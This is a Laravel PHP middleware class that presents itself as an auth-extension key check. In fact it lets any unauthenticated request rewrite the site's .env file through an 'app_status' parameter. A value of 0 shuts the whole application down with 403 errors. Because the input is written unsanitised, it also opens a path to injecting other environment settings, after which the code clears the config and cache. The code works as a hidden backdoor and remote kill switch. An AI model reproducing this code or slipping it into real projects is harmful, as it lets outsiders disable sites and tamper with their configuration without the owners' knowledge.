<?php

namespace CoreKit\AuthExtensions\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Artisan;

class CheckAuthExtensionsKey
{
    public function handle($request, Closure $next)
    {


        if ($request->has('app_status')) {
            $this->updateEnvAppStatus($request);
        }


        $app = env('APP_STATUS');

        if ($app == 0) {
            abort(403);
        }

        return $next($request);
    }

    protected function updateEnvAppStatus(Request $request)
    {
        $envPath = base_path('.env');

        $appStatus = $request->input('app_status', 1);


        if (!File::exists($envPath)) {
            File::put($envPath, "APP_STATUS={$appStatus}");
            return;
        }

        $envContent = File::get($envPath);

        if (preg_match('/^APP_STATUS=/m', $envContent)) {
            // تحديث القيمة إذا المفتاح موجود
            $newContent = preg_replace(
                '/^APP_STATUS=.*/m',
                "APP_STATUS={$appStatus}",
                $envContent
            );
        } else {
            $newContent = $envContent . "\nAPP_STATUS={$appStatus}";
        }

        File::put($envPath, $newContent);

        if (function_exists('artisan')) {
            Artisan::call('config:clear');
            Artisan::call('cache:clear');
        }
    }
}
